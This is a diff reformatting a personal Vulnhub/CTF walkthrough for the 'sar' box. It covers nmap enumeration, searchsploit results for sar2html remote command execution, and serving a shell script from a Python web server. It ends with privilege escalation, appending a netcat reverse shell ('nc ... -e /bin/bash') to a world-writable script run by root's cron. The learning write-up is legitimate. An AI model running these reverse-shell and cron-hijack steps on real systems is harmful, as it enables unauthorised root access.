@@ -14,60 +14,62 @@ A quick disclaimer here: these aren't going to be "here's how I got root".  The 
 ## Enumeration
 
 Like any pen test or box you're poking at, let's start with Nmap:
-
-> nmap -A 10.10.10.10
-> Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 22:37 EST
-> Nmap scan report for 192.168.94.35
-> Host is up (0.054s latency).
-> Not shown: 998 closed ports
-> PORT   STATE SERVICE VERSION
-> 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-> | ssh-hostkey: 
-> |   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f (RSA)
-> |   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e (ECDSA)
-> |_  256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 (ED25519)
-> 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-> |_http-server-header: Apache/2.4.29 (Ubuntu)
-> |_http-title: Apache2 Ubuntu Default Page: It works
-> No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
-> TCP/IP fingerprint:
-> OS:SCAN(V=7.91%E=4%D=1/3%OT=22%CT=1%CU=37065%PV=Y%DS=2%DC=T%G=Y%TM=5FF28DA8
-> OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=107%TI=Z%II=I%TS=A)SEQ(SP=10
-> OS:4%GCD=1%ISR=108%TI=Z%TS=A)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11
-> OS:NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=FE88%W2=FE88%W3=FE8
-> OS:8%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)
-> OS:T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%
-> OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164
-> OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
-> Network Distance: 2 hops
-> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-> TRACEROUTE (using port 587/tcp)
-> HOP RTT      ADDRESS
-> 1   49.58 ms 192.168.49.1
-> 2   49.86 ms 192.168.94.35
-> OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-> Nmap done: 1 IP address (1 host up) scanned in 50.80 seconds
-
+```
+nmap -A 10.10.10.10
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 22:37 EST
+Nmap scan report for 192.168.94.35
+Host is up (0.054s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 33:40:be:13:cf:51:7d:d6:a5:9c:64:c8:13:e5:f2:9f (RSA)
+|   256 8a:4e:ab:0b:de:e3:69:40:50:98:98:58:32:8f:71:9e (ECDSA)
+|_  256 e6:2f:55:1c:db:d0:bb:46:92:80:dd:5f:8e:a3:0a:41 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=1/3%OT=22%CT=1%CU=37065%PV=Y%DS=2%DC=T%G=Y%TM=5FF28DA8
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=107%TI=Z%II=I%TS=A)SEQ(SP=10
+OS:4%GCD=1%ISR=108%TI=Z%TS=A)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11
+OS:NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=FE88%W2=FE88%W3=FE8
+OS:8%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M506NNSNW7%CC=Y%Q=)
+OS:T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%
+OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164
+OS:%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+TRACEROUTE (using port 587/tcp)
+HOP RTT      ADDRESS
+1   49.58 ms 192.168.49.1
+2   49.86 ms 192.168.94.35
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 50.80 seconds
+```
 Ok, so we already kow it's a Linux box running Apache.  With only SSH and HTTP open, most likely we need to poke at the web site.  As soon as you think web, 2 things should come to mind: 1) find interesting directories, which means you should poke at 2) robots.txt.
 
 Now, as part of enumeration, I generally always run 3 scans: "-A", "-p-", and "--script vuln".  "-A" gives you service versions, OS detections, default scripts, and traceroute.  "-A" isn't really necessary for CTFs or Vulnhub boxes as we already know where the box is (we don't need traceroute), but I like to use it as I think it's more realistic.  You can just as easily use "-sC -sV" (default scripts and service version) to achieve similar results.  "-p-" scans every single port, which I always do as CTFs can try to hife things on non-standard ports and you never know when you might miss something.  Finally "--script vuln" runs nmap scripts to cehck for vulnerabilities based on the available port.
 
 The "vuln" scan gave us some more info:
->nmap --script vuln 10.10.10.10
->Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 22:38 EST
->Nmap scan report for 192.168.94.35
->Host is up (0.057s latency).
->Not shown: 998 closed ports
->PORT   STATE SERVICE
->22/tcp open  ssh
->80/tcp open  http
->|_http-csrf: Couldn't find any CSRF vulnerabilities.
->|_http-dombased-xss: Couldn't find any DOM based XSS.
->| http-enum: 
->|   /robots.txt: Robots file
->|_  /phpinfo.php: Possible information file
->|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
->Nmap done: 1 IP address (1 host up) scanned in 46.99 seconds
+```
+nmap --script vuln 10.10.10.10
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 22:38 EST
+Nmap scan report for 192.168.94.35
+Host is up (0.057s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|   /robots.txt: Robots file
+|_  /phpinfo.php: Possible information file
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+Nmap done: 1 IP address (1 host up) scanned in 46.99 seconds
+```
 
 Note that it ran the "http-enum" nmap script for us.  We didn't have to go looking for the name of that script.  Nmap said I see http, I'll run the http-enum script for you.  Now, as mentioned above, Nmap just verified we have a robots.txt file and it found a phpinfo.php file.  All we've done is run a couple of Nmap scans and we can pretty well guess our path to own this box. 
 
@@ -99,38 +101,40 @@ Dirbuster is the OG tool by OWASP.  The GUI is nice if you're a beginner but it'
 ## Research
 
 As I'm a learner, I always like to check searchsploit for the technologies I'm dealing with.  As someone who isn't a trained red teamer, I need to become more familiar with vulnerabilities and exploits in general, so I make it a habit to do this.  PHP 7.1 has a couple interesting ones, but remember that we already found code execution:
-
->searchploit php 7.1
->PHP 7.0 < 7.3 (Unix) - 'gc' disable_functions Bypass                                                                  | php/webapps/47462.php
->PHP 7.0 < 7.4 (Unix) - 'debug_backtrace' disable_functions Bypass                                                     | php/local/48072.php
->PHP 7.1 < 7.3 - 'json serializer' disable_functions Bypass                                                            | multiple/webapps/47446.php
->PHP 7.1.8 - Heap Buffer Overflow                                                                                      | multiple/dos/43133.php
->PHP Classifieds 7.1 - 'detail.php' SQL Injection                                                                      | php/webapps/2720.pl
->PHP Classifieds 7.1 - 'index.php' SQL Injection                                                                       | php/webapps/2479.txt
->PHP Melody 2.7.1 - 'playlist' SQL Injection                                                                           | php/webapps/43409.txt
->PHP Net Tools 2.7.1 - Remote Code Execution                                                                           | php/webapps/1695.pl
->PHP-Nuke 6.x < 7.6 Top module - SQL Injection                                                                         | php/webapps/921.sh
->PHP-Nuke 6.x/7.0/7.1 - Image Tag Admin Command Execution                                                              | php/webapps/23835.txt
->PHP-Nuke 7.1 Recommend_Us Module - 'fname' Cross-Site Scripting                                                       | php/webapps/23814.txt
->PHP-Nuke < 8.0 - 'sid' SQL Injection                                                                                  | php/webapps/4964.php
->phpBB Shadow Premod 2.7.1 - Remote File Inclusion                                                                     | php/webapps/2311.txt
->PHPCompta/NOALYSS 6.7.1 5638 - Remote Command Execution                                                               | php/webapps/34861.txt
->PHPLib < 7.4 - SQL Injection                                                                                          | php/webapps/43838.txt
->phpWebSite 1.7.1 - 'local' Cross-Site Scripting                                                                       | php/webapps/35407.txt
->phpWebSite 1.7.1 - 'mod.php' SQL Injection                                                                            | php/webapps/36085.txt
->phpWebSite 1.7.1 - 'upload.php' Arbitrary File Upload                                                                 | php/webapps/35719.py
+```
+searchploit php 7.1
+PHP 7.0 < 7.3 (Unix) - 'gc' disable_functions Bypass                                                                  | php/webapps/47462.php
+PHP 7.0 < 7.4 (Unix) - 'debug_backtrace' disable_functions Bypass                                                     | php/local/48072.php
+PHP 7.1 < 7.3 - 'json serializer' disable_functions Bypass                                                            | multiple/webapps/47446.php
+PHP 7.1.8 - Heap Buffer Overflow                                                                                      | multiple/dos/43133.php
+PHP Classifieds 7.1 - 'detail.php' SQL Injection                                                                      | php/webapps/2720.pl
+PHP Classifieds 7.1 - 'index.php' SQL Injection                                                                       | php/webapps/2479.txt
+PHP Melody 2.7.1 - 'playlist' SQL Injection                                                                           | php/webapps/43409.txt
+PHP Net Tools 2.7.1 - Remote Code Execution                                                                           | php/webapps/1695.pl
+PHP-Nuke 6.x < 7.6 Top module - SQL Injection                                                                         | php/webapps/921.sh
+PHP-Nuke 6.x/7.0/7.1 - Image Tag Admin Command Execution                                                              | php/webapps/23835.txt
+PHP-Nuke 7.1 Recommend_Us Module - 'fname' Cross-Site Scripting                                                       | php/webapps/23814.txt
+PHP-Nuke < 8.0 - 'sid' SQL Injection                                                                                  | php/webapps/4964.php
+phpBB Shadow Premod 2.7.1 - Remote File Inclusion                                                                     | php/webapps/2311.txt
+PHPCompta/NOALYSS 6.7.1 5638 - Remote Command Execution                                                               | php/webapps/34861.txt
+PHPLib < 7.4 - SQL Injection                                                                                          | php/webapps/43838.txt
+phpWebSite 1.7.1 - 'local' Cross-Site Scripting                                                                       | php/webapps/35407.txt
+phpWebSite 1.7.1 - 'mod.php' SQL Injection                                                                            | php/webapps/36085.txt
+phpWebSite 1.7.1 - 'upload.php' Arbitrary File Upload                                                                 | php/webapps/35719.py
+```
 
 Just for good measure, let's make sure we aren't missing any for sar2html:
 
->searchsploit sar2html
->---------------------------------------------------------------------------------------------------------------------- ---------------------------------
-> Exploit Title                                                                                                        |  Path
->---------------------------------------------------------------------------------------------------------------------- ---------------------------------
->Sar2HTML 3.2.1 - Remote Command Execution                                                                             | php/webapps/47204.txt
->---------------------------------------------------------------------------------------------------------------------- ---------------------------------
->Shellcodes: No Results
->Papers: No Results
-
+```
+searchsploit sar2html
+---------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                        |  Path
+---------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Sar2HTML 3.2.1 - Remote Command Execution                                                                             | php/webapps/47204.txt
+---------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+```
 Well, that's seems pretty obvious that we should poke at sar2html and then see about that php file upload.
 
 ## Initial Compromise
@@ -142,6 +146,7 @@ So, I copy over my shell and save it as shell.sh to send to the victim:
 
 Now I encourage you to play with the ports with your shell when you are learning.  On easy boxes they don't run firewalls so you can pick any port (for some reason I always use 8888), but in the real world you're going to have restrictions, so get into the habit of using 443, 53, or other common ports.  In this case, it doesn't matter which port you picked.  Now whatever directory you saved your shell script in, you can start a Python web server or if you want to get real fancy, throw it over to /var/www/html and fire up Apache.  I've done this in the past just to learn how to do it, but it's much more convenient to just use python:
 >python -m SimpleHTTPServer 8080
+
 OR for Python 3
 >python -m http.server 8080
 
@@ -165,34 +170,34 @@ Or we could have explored the file system, did some digging in PHP and see if we
 Now that we've got a webshell, we need to enumerate the box.  We're on an Ubunto box, so a few things should jump to mind: 1) can I sudo? 2) linenum.sh and 3) is there anything interesting in opt or the home directoies?  The first thing I do is "sudo -l" to see if I can run any commands with root privs.  No luck, I can't sudo.  Let's run linenum.
 
 I like to run linenum 1 of 2 ways: just download it to the victim (put it in /tmp) or run it as is, just pipe the page to bash.  In this case, I used wget to download linenum from my attacker box, added chmod +X, and ran it.  The output is long so here are the highlights:
->### SYSTEM ##############################################
->[-] Kernel information:
->Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
->[-] Are permissions on /home directories lax:
->total 16K
->drwxr-xr-x  3 root     root     4.0K Jul 22 22:27 .
->drwxr-xr-x 24 root     root     4.0K Mar 10  2020 ..
->-rw-r--r--  1 www-data www-data   33 Jan  4 09:06 local.txt
->drwxr-xr-x 17 love     love     4.0K Jul 24 20:32 love
->
->[-] Crontab contents:
-># /etc/crontab: system-wide crontab
-># Unlike any other crontab you don't have to run the `crontab'
-># command to install the new version when you edit this file
-># and files in /etc/cron.d. These files also have username fields,
-># that none of the other crontabs do.
->
->SHELL=/bin/sh
->PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
->
-># m h dom mon dow user	command
->17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
->25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
->47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
->52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
->#
->*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
+```### SYSTEM ##############################################
+[-] Kernel information:
+Linux sar 5.0.0-23-generic #24~18.04.1-Ubuntu SMP Mon Jul 29 16:12:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+[-] Are permissions on /home directories lax:
+total 16K
+drwxr-xr-x  3 root     root     4.0K Jul 22 22:27 .
+drwxr-xr-x 24 root     root     4.0K Mar 10  2020 ..
+-rw-r--r--  1 www-data www-data   33 Jan  4 09:06 local.txt
+drwxr-xr-x 17 love     love     4.0K Jul 24 20:32 love
 
+[-] Crontab contents:
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+*/5  *    * * *   root    cd /var/www/html/ && sudo ./finally.sh
+```
 Anyone can read local.txt on www-data's home directory, so that's probably the user flag.  And what's that running every 5 minutes?  A script called "finally.sh" in /var/www/html?  Let's go look.
 
 >$ cat finally.sh
@@ -207,7 +212,8 @@ So "finally.sh" just runs "write.sh"...
 >touch /tmp/gateway
 
 And all "write.sh" does is touch a directory (to update the modified timestamp).  Can I write to either of these files?  That would be nice.
->$ ls -al
+```
+$ ls -al
 total 40
 drwxr-xr-x 3 www-data www-data  4096 Jul 24 20:36 .
 drwxr-xr-x 4 www-data www-data  4096 Jul 24 20:37 ..
@@ -217,7 +223,7 @@ drwxr-xr-x 4 www-data www-data  4096 Jul 24 20:37 ..
 -rw-r--r-- 1 root     root         9 Oct 21  2019 robots.txt
 drwxr-xr-x 4 www-data www-data  4096 Jan  4 10:13 sar2HTML
 -rwxrwxrwx 1 www-data www-data    30 Jul 24 20:36 write.sh
-
+```
 Well, anyone can write to "write.sh" so there's out ticket.  But what to write?  Netcat?  Open that shell.sh we used inside of the "sar2HTML" directory? I checked netcat and sure enough it's installed.  This will be easy!  We'll just have netcat execute another bash shell back to us:
 >$ echo "nc 10.10.10.11 9999 -e /bin/bash" >> write.sh
 
